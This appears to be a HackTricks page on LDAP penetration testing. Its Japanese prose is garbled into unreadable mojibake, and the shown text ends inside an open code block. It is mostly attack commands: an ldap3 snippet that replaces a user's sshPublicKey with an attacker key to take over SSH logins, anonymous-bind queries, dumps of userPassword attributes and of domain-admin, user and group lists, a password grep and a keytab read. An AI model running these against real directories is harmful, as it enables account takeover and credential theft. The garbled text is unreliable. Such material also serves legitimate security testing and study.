# 389, 636, 3268, 3269 - LDAPã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€HackTricksã‚’PDFã§**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## åŸºæœ¬æƒ…å ±

å‡ºå…¸: [https://searchmobilecomputing.techtarget.com/definition/LDAP](https://searchmobilecomputing.techtarget.com/definition/LDAP)

LDAPï¼ˆLightweight Directory Access Protocolï¼‰ã¯ã€å…¬å…±ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã‚‚ä¼æ¥­ã®ã‚¤ãƒ³ãƒˆãƒ©ãƒãƒƒãƒˆã§ã‚‚ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®çµ„ç¹”ã€å€‹äººã€ãã®ä»–ã®**ãƒªã‚½ãƒ¼ã‚¹**ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ãƒã‚¤ã‚¹ãªã©ï¼‰ã‚’**æ¤œç´¢**ã™ã‚‹ãŸã‚ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚LDAPã¯Directory Access Protocolï¼ˆDAPï¼‰ã®ã€Œè»½é‡ã€ï¼ˆã‚³ãƒ¼ãƒ‰é‡ãŒå°‘ãªã„ï¼‰ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã™ã€‚

LDAPãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¯ã€å¤šãã®ã‚µãƒ¼ãƒãƒ¼ã«**åˆ†æ•£**ã•ã‚Œã¦ã„ã¾ã™ã€‚å„ã‚µãƒ¼ãƒãƒ¼ã¯ã€å®šæœŸçš„ã«**åŒæœŸ**ã•ã‚Œã‚‹å…¨ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®**è¤‡è£½**ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚LDAPã‚µãƒ¼ãƒãƒ¼ã¯Directory System Agentï¼ˆDSAï¼‰ã¨å‘¼ã°ã‚Œã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å–ã£ãŸLDAPã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã™ã‚‹è²¬ä»»ã‚’æŒã¡ã€å¿…è¦ã«å¿œã˜ã¦ä»–ã®DSAã«æ¸¡ã—ã¾ã™ãŒã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦å˜ä¸€ã®èª¿æ•´ã•ã‚ŒãŸå¿œç­”ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

LDAPãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¯ã€ä»¥ä¸‹ã®ãƒ¬ãƒ™ãƒ«ã‚’å«ã‚€å˜ç´”ãªã€Œãƒ„ãƒªãƒ¼ã€éšå±¤ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ï¼š

* ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼ˆãƒ„ãƒªãƒ¼ã®å‡ºç™ºç‚¹ã¾ãŸã¯æºï¼‰ã€ã“ã‚ŒãŒåˆ†å²ã—ã¦
* å„å›½ã€ãã‚Œãã‚ŒãŒåˆ†å²ã—ã¦
* çµ„ç¹”ã€ã“ã‚ŒãŒåˆ†å²ã—ã¦
* çµ„ç¹”å˜ä½ï¼ˆéƒ¨é–€ã€éƒ¨ç½²ãªã©ï¼‰ã€ã“ã‚ŒãŒåˆ†å²ã—ã¦ï¼ˆã‚¨ãƒ³ãƒˆãƒªã‚’å«ã‚€ï¼‰
* å€‹äººï¼ˆäººã€…ã€ãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ—ãƒªãƒ³ã‚¿ãƒ¼ãªã©ã®å…±æœ‰ãƒªã‚½ãƒ¼ã‚¹ã‚’å«ã‚€ï¼‰

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆï¼š** 389ãŠã‚ˆã³636ï¼ˆldapsï¼‰ã€‚ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚«ã‚¿ãƒ­ã‚°ï¼ˆActiveDirectoryã®LDAPï¼‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒ¼ãƒˆ3268ãŠã‚ˆã³LDAPSã®3269ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAPãƒ‡ãƒ¼ã‚¿äº¤æ›ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ

LDIFï¼ˆLDAP Data Interchange Formatï¼‰ã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å†…å®¹ã‚’ä¸€é€£ã®ãƒ¬ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦å®šç¾©ã—ã¾ã™ã€‚ã¾ãŸã€æ›´æ–°ãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼ˆè¿½åŠ ã€å¤‰æ›´ã€å‰Šé™¤ã€åå‰å¤‰æ›´ï¼‰ã‚’è¡¨ã™ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* 1ã€œ3è¡Œç›®ã¯ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³localã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 5ã€œ8è¡Œç›®ã¯ãƒ•ã‚¡ãƒ¼ã‚¹ãƒˆãƒ¬ãƒ™ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³moneycorpï¼ˆmoneycorp.localï¼‰ã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 10ã€œ16è¡Œç›®ã¯2ã¤ã®çµ„ç¹”å˜ä½ï¼šdevã¨salesã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 18ã€œ26è¡Œç›®ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã€å±æ€§ã«å€¤ã‚’å‰²ã‚Šå½“ã¦ã¾ã™

## ãƒ‡ãƒ¼ã‚¿ã®æ›¸ãè¾¼ã¿

å€¤ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆã€éå¸¸ã«èˆˆå‘³æ·±ã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**"sshPublicKey"æƒ…å ±ã‚’å¤‰æ›´ã§ãã‚‹**ã¨æƒ³åƒã—ã¦ãã ã•ã„ã€‚ã“ã®å±æ€§ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€**sshã¯LDAPã‹ã‚‰å…¬é–‹éµã‚’èª­ã¿è¾¼ã‚“ã§ã„ã‚‹**å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¬é–‹éµã‚’å¤‰æ›´ã§ãã‚Œã°ã€**sshã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰èªè¨¼ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ãªãã¦ã‚‚ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹**ã§ã—ã‚‡ã†ã€‚
```bash
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆè³‡æ ¼æƒ…å ±ã®ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

LDAPãŒSSLãªã—ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§**ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®è³‡æ ¼æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€**LDAPã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®é–“ã§**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§**MITM**æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã“ã§**ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰æ”»æ’ƒ**ã‚’è¡Œã†ã¨ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯**ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¾ã™ã€‚

**SSLãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€ä¸Šè¨˜ã®ã‚ˆã†ã«**MITM**ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€**å½ã®è¨¼æ˜æ›¸**ã‚’æä¾›ã—ã¾ã™ã€‚**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã‚Œã‚’å—ã‘å…¥ã‚ŒãŸå ´åˆ**ã€èªè¨¼æ–¹æ³•ã‚’ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã—ã¦å†ã³è³‡æ ¼æƒ…å ±ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## åŒ¿åã‚¢ã‚¯ã‚»ã‚¹

### TLS SNIãƒã‚§ãƒƒã‚¯ã®ãƒã‚¤ãƒ‘ã‚¹

[**ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ã«ã‚ˆã‚‹ã¨ã€å½¼ã¯ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åï¼ˆcompany.comã®ã‚ˆã†ãªï¼‰ã§LDAPã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ã€åŒ¿åãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦LDAPã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã—ã€æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAPåŒ¿åãƒã‚¤ãƒ³ãƒ‰

[LDAPåŒ¿åãƒã‚¤ãƒ³ãƒ‰](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)ã¯ã€**èªè¨¼ã•ã‚Œã¦ã„ãªã„æ”»æ’ƒè€…**ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå±æ€§ã€ãŠã‚ˆã³ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã®å®Œå…¨ãªãƒªã‚¹ãƒˆãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã‚Œã¯**ãƒ¬ã‚¬ã‚·ãƒ¼ãªè¨­å®š**ã§ã‚ã‚Šã€Windows Server 2003ä»¥é™ã€èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ãŒLDAPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é–‹å§‹ã™ã‚‹ã“ã¨ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™ã€‚\
ã—ã‹ã—ã€ç®¡ç†è€…ã¯ç‰¹å®šã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§åŒ¿åãƒã‚¤ãƒ³ãƒ‰ã‚’**è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã£ãŸ**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€æ„å›³ã—ãŸä»¥ä¸Šã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä¸ãˆã¦ã—ã¾ã„ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒADå†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±

LDAPã‚µãƒ¼ãƒãƒ¼ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…ã«é–¢ã™ã‚‹ã™ã¹ã¦ã®æƒ…å ±ã‚’ãƒ€ãƒ³ãƒ—ã§ãã¾ã™ï¼š

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-methodologies-and-resources/brute-force.md#ldap)

## åˆ—æŒ™

### è‡ªå‹•åŒ–

ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**å…¬é–‹æƒ…å ±**ï¼ˆãƒ‰ãƒ¡ã‚¤ãƒ³åãªã©ï¼‰ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Pythonã‚’ä½¿ã£ãŸLDAPåˆ—æŒ™ã‚’è¦‹ã‚‹</summary>

**è³‡æ ¼æƒ…å ±ã®æœ‰ç„¡ã«ã‹ã‹ã‚ã‚‰ãšPythonã‚’ä½¿ç”¨ã—ã¦LDAPã‚’åˆ—æŒ™ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™: `pip3 install ldap3`

ã¾ãšã€è³‡æ ¼æƒ…å ±**ãªã—ã§**æ¥ç¶šã‚’è©¦ã¿ã¾ã™:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
å¿œç­”ãŒå‰ã®ä¾‹ã®ã‚ˆã†ã«`True`ã§ã‚ã‚‹å ´åˆã€LDAPï¼ˆ**naming context**ã‚„**domain name**ãªã©ï¼‰ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã„ãã¤ã‹ã®**èˆˆå‘³æ·±ã„ãƒ‡ãƒ¼ã‚¿**ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
```markdown
ä¸€åº¦å‘½åã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹ã¨ã€ã‚‚ã£ã¨ã‚¨ã‚­ã‚µã‚¤ãƒ†ã‚£ãƒ³ã‚°ãªã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã®ã‚·ãƒ³ãƒ—ãƒ«ãªã‚¯ã‚¨ãƒªã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’è¡¨ç¤ºã™ã‚‹ã¯ãšã§ã™ï¼š
```
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
ã¾ãŸã¯ã€ldapå…¨ä½“ã‚’**ãƒ€ãƒ³ãƒ—**ã—ã¾ã™ï¼š
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) \*\*\*\* ã¯ã€LDAPã‚¯ã‚¨ãƒªã‚’åˆ©ç”¨ã—ã¦**Windowsãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹**ãŸã‚ã®Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

nullã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ãŒã‚ã‚‹ã‹ã€ã¾ãŸã¯ã‚ãªãŸã®ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
```
_bindãŒå®Œäº†ã—ãªã‘ã‚Œã°ãªã‚‰ãªã„_ã¨ã„ã†è¡¨ç¤ºãŒã‚ã‚‹å ´åˆã€ãã‚Œã¯è³‡æ ¼æƒ…å ±ãŒæ­£ã—ããªã„ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰**ã™ã¹ã¦ã‚’æŠ½å‡º**ã™ã‚‹ã«ã¯ï¼š
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®æŠ½å‡ºï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼**ã®æŠ½å‡ºï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ç§ã®æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…ã®æŠ½å‡º**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æŠ½å‡º**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºç®¡ç†è€…ã‚’æŠ½å‡ºã™ã‚‹**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ç®¡ç†è€…**ã®æŠ½å‡ºï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚°ãƒ«ãƒ¼ãƒ—**ã®æŠ½å‡ºï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
ã‚¯ã‚¨ãƒªã®å®Ÿè¡Œå¾Œã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€grepã‚’ä½¿ç”¨ã§ãã¾ã™:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
ä»¥ä¸‹ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯å®Ÿéš›ã®ã‚‚ã®ã§ã¯ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã®ã§ã”æ³¨æ„ãã ã•ã„...

#### pbis

**pbis**ã¯ã“ã¡ã‚‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) é€šå¸¸ã€`/opt/pbis`ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã¾ã™ã€‚\
**Pbis**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€åŸºæœ¬æƒ…å ±ã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
